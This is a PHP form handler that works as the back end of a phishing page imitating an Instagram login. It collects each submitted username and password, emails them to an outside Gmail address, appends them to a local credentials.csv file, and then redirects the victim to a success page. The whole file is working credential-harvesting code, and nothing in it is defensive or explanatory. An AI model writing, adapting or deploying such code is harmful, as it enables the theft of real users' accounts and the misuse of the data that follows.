<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Store credentials in a CSV file
    $to = 'bharathbackup31@gmail.com';
    $subject = 'New Instagram Login Credentials';
    $message = "Username: $username\nPassword: $password";
    $headers = 'From: noreply@kingsmannexus.com' . "\r\n" .
               'Reply-To: noreply@kingsmannexus.com' . "\r\n" .
               'X-Mailer: PHP/' . phpversion();

    // Send email with credentials
    mail($to, $subject, $message, $headers);

    $file = fopen("credentials.csv", "a");
    fputcsv($file, array($username, $password));
    fclose($file);

    // Redirect to a success page or display a success message
    header("Location: ../html/success.html");
    exit();
}
?>
